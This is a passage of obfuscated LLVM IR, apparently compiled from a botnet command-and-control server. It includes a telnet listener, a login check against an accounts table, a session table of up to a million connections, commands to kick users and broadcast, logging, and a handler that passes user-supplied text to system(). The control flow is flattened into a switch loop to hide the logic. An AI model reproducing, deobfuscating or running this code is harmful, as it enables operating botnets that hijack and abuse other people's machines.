  %734 = call i32 (i8*, i8*, ...) @sprintf(i8* %733, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %735 = load i32, i32* %4, align 4
  %736 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %738 = call i64 @strlen(i8* %737) #8
  %739 = call i64 @send(i32 %735, i8* %736, i64 %738, i32 16384)
  %740 = icmp eq i64 %739, -1
  %741 = select i1 %740, i32 -2066279248, i32 -151677497
  store i32 %741, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  store i32 -151677497, i32* %switchVar
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  store i32 1228708119, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  store i32 1512487413, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %747 = call i8* @strstr(i8* %746, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #8
  %748 = icmp ne i8* %747, null
  %749 = select i1 %748, i32 -466629872, i32 -248424997
  store i32 %749, i32* %switchVar
  br label %loopEnd

; <label>:750:                                    ; preds = %loopEntry
  %751 = load i8*, i8** %13, align 8
  %752 = load i32, i32* %5, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %753
  %755 = getelementptr inbounds %struct.account, %struct.account* %754, i32 0, i32 2
  %756 = getelementptr inbounds [200 x i8], [200 x i8]* %755, i32 0, i32 0
  %757 = call i32 @strcmp(i8* %751, i8* %756) #8
  %758 = icmp eq i32 %757, 0
  %759 = select i1 %758, i32 880195429, i32 -921081026
  store i32 %759, i32* %switchVar
  br label %loopEnd

; <label>:760:                                    ; preds = %loopEntry
  %761 = load i8*, i8** %13, align 8
  %762 = load i32, i32* %5, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %763
  %765 = getelementptr inbounds %struct.account, %struct.account* %764, i32 0, i32 2
  %766 = getelementptr inbounds [200 x i8], [200 x i8]* %765, i32 0, i32 0
  %767 = call i32 @strcmp(i8* %761, i8* %766) #8
  %768 = icmp eq i32 %767, 0
  %769 = select i1 %768, i32 880195429, i32 -363287900
  store i32 %769, i32* %switchVar
  br label %loopEnd

; <label>:770:                                    ; preds = %loopEntry
  %771 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %772 = call i8* @strstr(i8* %771, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0)) #8
  %773 = icmp ne i8* %772, null
  %774 = select i1 %773, i32 168766848, i32 954752167
  store i32 %774, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  %776 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %777 = call i8* @strstr(i8* %776, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)) #8
  %778 = icmp ne i8* %777, null
  %779 = select i1 %778, i32 168766848, i32 2119401692
  store i32 %779, i32* %switchVar
  br label %loopEnd

; <label>:780:                                    ; preds = %loopEntry
  %781 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %782 = call i8* @strtok(i8* %781, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %782, i8** %37, align 8
  %783 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %784 = load i8*, i8** %37, align 8
  %785 = load i8*, i8** %37, align 8
  %786 = call i64 @strlen(i8* %785) #8
  %787 = getelementptr inbounds i8, i8* %784, i64 %786
  %788 = getelementptr inbounds i8, i8* %787, i64 1
  %789 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %783, i64 20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %788) #7
  %790 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  call void @trim(i8* %790)
  store i32 0, i32* %35, align 4
  store i32 -1676907367, i32* %switchVar
  br label %loopEnd

; <label>:791:                                    ; preds = %loopEntry
  %792 = load i32, i32* %35, align 4
  %793 = icmp slt i32 %792, 1000000
  %794 = select i1 %793, i32 826393634, i32 130053431
  store i32 %794, i32* %switchVar
  br label %loopEnd

; <label>:795:                                    ; preds = %loopEntry
  %796 = load i32, i32* %35, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %797
  %799 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %798, i32 0, i32 2
  %800 = getelementptr inbounds [20 x i8], [20 x i8]* %799, i32 0, i32 0
  %801 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %802 = call i8* @strstr(i8* %800, i8* %801) #8
  %803 = icmp ne i8* %802, null
  %804 = select i1 %803, i32 -880802308, i32 2071546651
  store i32 %804, i32* %switchVar
  br label %loopEnd

; <label>:805:                                    ; preds = %loopEntry
  %806 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %807 = load i32, i32* %4, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %808
  %810 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %809, i32 0, i32 2
  %811 = getelementptr inbounds [20 x i8], [20 x i8]* %810, i32 0, i32 0
  %812 = call i32 (i8*, i8*, ...) @sprintf(i8* %806, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %811) #7
  %813 = load i32, i32* %35, align 4
  %814 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %815 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %816 = call i64 @strlen(i8* %815) #8
  %817 = call i64 @send(i32 %813, i8* %814, i64 %816, i32 16384)
  %818 = icmp eq i64 %817, -1
  %819 = select i1 %818, i32 1214258676, i32 -33202122
  store i32 %819, i32* %switchVar
  br label %loopEnd

; <label>:820:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:821:                                    ; preds = %loopEntry
  %822 = load i32, i32* %35, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %823
  %825 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %824, i32 0, i32 1
  store i32 0, i32* %825, align 4
  %826 = load i32, i32* %35, align 4
  %827 = call i32 @close(i32 %826)
  %828 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %829 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %830 = call i32 (i8*, i8*, ...) @sprintf(i8* %828, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.83, i32 0, i32 0), i8* %829) #7
  %831 = load i32, i32* %4, align 4
  %832 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %833 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %834 = call i64 @strlen(i8* %833) #8
  %835 = call i64 @send(i32 %831, i8* %832, i64 %834, i32 16384)
  %836 = icmp eq i64 %835, -1
  %837 = select i1 %836, i32 -835742820, i32 1274430543
  store i32 %837, i32* %switchVar
  br label %loopEnd

; <label>:838:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:839:                                    ; preds = %loopEntry
  store i32 2071546651, i32* %switchVar
  br label %loopEnd

; <label>:840:                                    ; preds = %loopEntry
  store i32 1586664638, i32* %switchVar
  br label %loopEnd

; <label>:841:                                    ; preds = %loopEntry
  %842 = load i32, i32* %35, align 4
  %843 = add nsw i32 %842, 1
  store i32 %843, i32* %35, align 4
  store i32 -1676907367, i32* %switchVar
  br label %loopEnd

; <label>:844:                                    ; preds = %loopEntry
  store i32 1497470075, i32* %switchVar
  br label %loopEnd

; <label>:845:                                    ; preds = %loopEntry
  %846 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %847 = call i8* @strstr(i8* %846, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #8
  %848 = icmp ne i8* %847, null
  %849 = select i1 %848, i32 -673212080, i32 -1931554778
  store i32 %849, i32* %switchVar
  br label %loopEnd

; <label>:850:                                    ; preds = %loopEntry
  %851 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %852 = call i8* @strstr(i8* %851, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0)) #8
  %853 = icmp ne i8* %852, null
  %854 = select i1 %853, i32 -673212080, i32 1597313197
  store i32 %854, i32* %switchVar
  br label %loopEnd

; <label>:855:                                    ; preds = %loopEntry
  %856 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %857 = call i8* @strtok(i8* %856, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %857, i8** %38, align 8
  %858 = load i8*, i8** %38, align 8
  %859 = load i8*, i8** %38, align 8
  %860 = call i64 @strlen(i8* %859) #8
  %861 = getelementptr inbounds i8, i8* %858, i64 %860
  %862 = getelementptr inbounds i8, i8* %861, i64 1
  %863 = call i32 @atoi(i8* %862) #8
  store i32 %863, i32* %39, align 4
  %864 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %865 = load i32, i32* %4, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %866
  %868 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %867, i32 0, i32 2
  %869 = getelementptr inbounds [20 x i8], [20 x i8]* %868, i32 0, i32 0
  %870 = call i32 (i8*, i8*, ...) @sprintf(i8* %864, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %869) #7
  %871 = load i32, i32* %39, align 4
  %872 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %873 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %874 = call i64 @strlen(i8* %873) #8
  %875 = call i64 @send(i32 %871, i8* %872, i64 %874, i32 16384)
  %876 = icmp eq i64 %875, -1
  %877 = select i1 %876, i32 -1753751119, i32 -1561813054
  store i32 %877, i32* %switchVar
  br label %loopEnd

; <label>:878:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:879:                                    ; preds = %loopEntry
  %880 = load i32, i32* %39, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %881
  %883 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %882, i32 0, i32 1
  store i32 0, i32* %883, align 4
  %884 = load i32, i32* %39, align 4
  %885 = call i32 @close(i32 %884)
  %886 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %887 = load i32, i32* %39, align 4
  %888 = call i32 (i8*, i8*, ...) @sprintf(i8* %886, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.86, i32 0, i32 0), i32 %887) #7
  %889 = load i32, i32* %4, align 4
  %890 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %891 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %892 = call i64 @strlen(i8* %891) #8
  %893 = call i64 @send(i32 %889, i8* %890, i64 %892, i32 16384)
  %894 = icmp eq i64 %893, -1
  %895 = select i1 %894, i32 1651627661, i32 -1964519420
  store i32 %895, i32* %switchVar
  br label %loopEnd

; <label>:896:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:897:                                    ; preds = %loopEntry
  store i32 1597313197, i32* %switchVar
  br label %loopEnd

; <label>:898:                                    ; preds = %loopEntry
  store i32 1497470075, i32* %switchVar
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  store i32 760002470, i32* %switchVar
  br label %loopEnd

; <label>:900:                                    ; preds = %loopEntry
  %901 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %902 = call i32 (i8*, i8*, ...) @sprintf(i8* %901, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.87, i32 0, i32 0)) #7
  %903 = load i32, i32* %4, align 4
  %904 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %905 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %906 = call i64 @strlen(i8* %905) #8
  %907 = call i64 @send(i32 %903, i8* %904, i64 %906, i32 16384)
  %908 = icmp eq i64 %907, -1
  %909 = select i1 %908, i32 1809221864, i32 -2060250181
  store i32 %909, i32* %switchVar
  br label %loopEnd

; <label>:910:                                    ; preds = %loopEntry
  store i32 -2060250181, i32* %switchVar
  br label %loopEnd

; <label>:911:                                    ; preds = %loopEntry
  store i32 760002470, i32* %switchVar
  br label %loopEnd

; <label>:912:                                    ; preds = %loopEntry
  store i32 -248424997, i32* %switchVar
  br label %loopEnd

; <label>:913:                                    ; preds = %loopEntry
  %914 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %915 = call i8* @strstr(i8* %914, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0)) #8
  %916 = icmp ne i8* %915, null
  %917 = select i1 %916, i32 876786499, i32 432440295
  store i32 %917, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load i8*, i8** %12, align 8
  %920 = load i32, i32* %5, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %921
  %923 = getelementptr inbounds %struct.account, %struct.account* %922, i32 0, i32 2
  %924 = getelementptr inbounds [200 x i8], [200 x i8]* %923, i32 0, i32 0
  %925 = call i32 @strcmp(i8* %919, i8* %924) #8
  %926 = icmp eq i32 %925, 0
  %927 = select i1 %926, i32 -1403570511, i32 1368211106
  store i32 %927, i32* %switchVar
  br label %loopEnd

; <label>:928:                                    ; preds = %loopEntry
  %929 = load i8*, i8** %13, align 8
  %930 = load i32, i32* %5, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %931
  %933 = getelementptr inbounds %struct.account, %struct.account* %932, i32 0, i32 2
  %934 = getelementptr inbounds [200 x i8], [200 x i8]* %933, i32 0, i32 0
  %935 = call i32 @strcmp(i8* %929, i8* %934) #8
  %936 = icmp eq i32 %935, 0
  %937 = select i1 %936, i32 -1403570511, i32 -1454888108
  store i32 %937, i32* %switchVar
  br label %loopEnd

; <label>:938:                                    ; preds = %loopEntry
  %939 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %940 = call i8* @strtok(i8* %939, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %940, i8** %40, align 8
  %941 = load i8*, i8** %40, align 8
  %942 = getelementptr inbounds i8, i8* %941, i64 8
  store i8* %942, i8** %41, align 8
  %943 = load i8*, i8** %41, align 8
  call void @trim(i8* %943)
  %944 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %945 = bitcast i8** %944 to i8*
  %946 = load i8*, i8** %41, align 8
  %947 = call i32 (i8*, i8*, ...) @sprintf(i8* %945, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i32 0, i32 0), i8* %946) #7
  %948 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %949 = bitcast i8** %948 to i8*
  %950 = call i32 @system(i8* %949)
  %951 = load i32, i32* %5, align 4
  %952 = sext i32 %951 to i64
  %953 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %952
  %954 = getelementptr inbounds %struct.account, %struct.account* %953, i32 0, i32 0
  %955 = getelementptr inbounds [200 x i8], [200 x i8]* %954, i32 0, i32 0
  %956 = load i8*, i8** %41, align 8
  %957 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %955, i8* %956)
  %958 = load i32, i32* %4, align 4
  %959 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %960 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %961 = call i64 @strlen(i8* %960) #8
  %962 = call i64 @send(i32 %958, i8* %959, i64 %961, i32 16384)
  %963 = icmp eq i64 %962, -1
  %964 = select i1 %963, i32 1756796143, i32 -1135345566
  store i32 %964, i32* %switchVar
  br label %loopEnd

; <label>:965:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:966:                                    ; preds = %loopEntry
  %967 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %967, %struct._IO_FILE** %43, align 8
  %968 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %969 = load i32, i32* %5, align 4
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %970
  %972 = getelementptr inbounds %struct.account, %struct.account* %971, i32 0, i32 0
  %973 = getelementptr inbounds [200 x i8], [200 x i8]* %972, i32 0, i32 0
  %974 = load i8*, i8** %41, align 8
  %975 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %968, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %973, i8* %974)
  %976 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %977 = call i32 @fclose(%struct._IO_FILE* %976)
  store i32 -891847607, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  %979 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %980 = call i32 (i8*, i8*, ...) @sprintf(i8* %979, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %981 = load i32, i32* %4, align 4
  %982 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %983 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %984 = call i64 @strlen(i8* %983) #8
  %985 = call i64 @send(i32 %981, i8* %982, i64 %984, i32 16384)
  %986 = icmp eq i64 %985, -1
  %987 = select i1 %986, i32 -1047123597, i32 1207301736
  store i32 %987, i32* %switchVar
  br label %loopEnd

; <label>:988:                                    ; preds = %loopEntry
  store i32 1207301736, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  store i32 -891847607, i32* %switchVar
  br label %loopEnd

; <label>:990:                                    ; preds = %loopEntry
  store i32 432440295, i32* %switchVar
  br label %loopEnd

; <label>:991:                                    ; preds = %loopEntry
  %992 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %993 = call i8* @strstr(i8* %992, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i32 0, i32 0)) #8
  %994 = icmp ne i8* %993, null
  %995 = select i1 %994, i32 -1049248292, i32 698755521
  store i32 %995, i32* %switchVar
  br label %loopEnd

; <label>:996:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:997:                                    ; preds = %loopEntry
  %998 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %998)
  %999 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1000 = load i32, i32* %5, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1001
  %1003 = getelementptr inbounds %struct.account, %struct.account* %1002, i32 0, i32 0
  %1004 = getelementptr inbounds [200 x i8], [200 x i8]* %1003, i32 0, i32 0
  %1005 = call i32 (i8*, i8*, ...) @sprintf(i8* %999, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %1004) #7
  %1006 = load i32, i32* %4, align 4
  %1007 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1008 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1009 = call i64 @strlen(i8* %1008) #8
  %1010 = call i64 @send(i32 %1006, i8* %1007, i64 %1009, i32 16384)
  %1011 = icmp eq i64 %1010, -1
  %1012 = select i1 %1011, i32 -1788100711, i32 602820483
  store i32 %1012, i32* %switchVar
  br label %loopEnd

; <label>:1013:                                   ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:1014:                                   ; preds = %loopEntry
  %1015 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1016 = call i64 @strlen(i8* %1015) #8
  %1017 = icmp eq i64 %1016, 0
  %1018 = select i1 %1017, i32 1158911300, i32 572889096
  store i32 %1018, i32* %switchVar
  br label %loopEnd

; <label>:1019:                                   ; preds = %loopEntry
  store i32 530523432, i32* %switchVar
  br label %loopEnd

; <label>:1020:                                   ; preds = %loopEntry
  %1021 = load i32, i32* %5, align 4
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1022
  %1024 = getelementptr inbounds %struct.account, %struct.account* %1023, i32 0, i32 0
  %1025 = getelementptr inbounds [200 x i8], [200 x i8]* %1024, i32 0, i32 0
  %1026 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1027 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %1025, i8* %1026)
  %1028 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %1028, %struct._IO_FILE** %44, align 8
  %1029 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %1030 = load i32, i32* %5, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1031
  %1033 = getelementptr inbounds %struct.account, %struct.account* %1032, i32 0, i32 0
  %1034 = getelementptr inbounds [200 x i8], [200 x i8]* %1033, i32 0, i32 0
  %1035 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1036 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1029, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %1034, i8* %1035)
  %1037 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %1038 = call i32 @fclose(%struct._IO_FILE* %1037)
  %1039 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1040 = load i32, i32* %4, align 4
  %1041 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %1039, i32 %1040, i8* %1041)
  %1042 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1042, i8 0, i64 2048, i32 16, i1 false)
  store i32 530523432, i32* %switchVar
  br label %loopEnd

; <label>:1043:                                   ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:1044:                                   ; preds = %loopEntry
  %1045 = load i32, i32* %4, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1046
  %1048 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1047, i32 0, i32 1
  store i32 0, i32* %1048, align 4
  %1049 = load i32, i32* %4, align 4
  %1050 = call i32 @close(i32 %1049)
  %1051 = load volatile i32, i32* @managesConnected, align 4
  %1052 = add nsw i32 %1051, -1
  store volatile i32 %1052, i32* @managesConnected, align 4
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:1053:                                   ; preds = %loopEntry
  %1054 = load i8*, i8** %2, align 8
  ret i8* %1054

loopEnd:                                          ; preds = %1044, %1043, %1020, %1019, %1014, %1013, %997, %996, %991, %990, %989, %988, %978, %966, %965, %938, %928, %918, %913, %912, %911, %910, %900, %899, %898, %897, %896, %879, %878, %855, %850, %845, %844, %841, %840, %839, %838, %821, %820, %805, %795, %791, %780, %775, %770, %760, %750, %745, %744, %743, %742, %732, %731, %728, %727, %726, %725, %709, %701, %692, %688, %687, %686, %676, %666, %656, %651, %650, %649, %644, %639, %622, %617, %600, %599, %594, %593, %583, %578, %573, %572, %571, %561, %560, %550, %545, %544, %543, %542, %532, %531, %530, %520, %519, %509, %508, %498, %497, %487, %486, %476, %466, %456, %451, %450, %449, %439, %438, %428, %427, %417, %412, %411, %410, %400, %399, %389, %388, %378, %373, %372, %371, %350, %345, %344, %343, %332, %327, %326, %325, %314, %311, %310, %308, %307, %287, %278, %272, %264, %260, %258, %253, %248, %243, %237, %219, %218, %203, %202, %197, %190, %189, %184, %183, %181, %180, %169, %168, %162, %161, %151, %126, %125, %119, %118, %108, %107, %106, %100, %99, %93, %73, %67, %65, %60, %54, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -347107041, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -347107041, label %first
    i32 -1712575556, label %15
    i32 2110631762, label %16
    i32 1126129078, label %30
    i32 -2091563579, label %31
    i32 941612665, label %34
    i32 569110776, label %71
    i32 -387266935, label %72
    i32 1937409196, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp slt i32 %.reload, 0
  %14 = select i1 %13, i32 -1712575556, i32 2110631762
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0))
  store i32 2110631762, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %20 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i32 0, i32 0
  store i32 0, i32* %20, align 4
  %21 = load i32, i32* %3, align 4
  %22 = trunc i32 %21 to i16
  %23 = call zeroext i16 @htons(i16 zeroext %22) #9
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
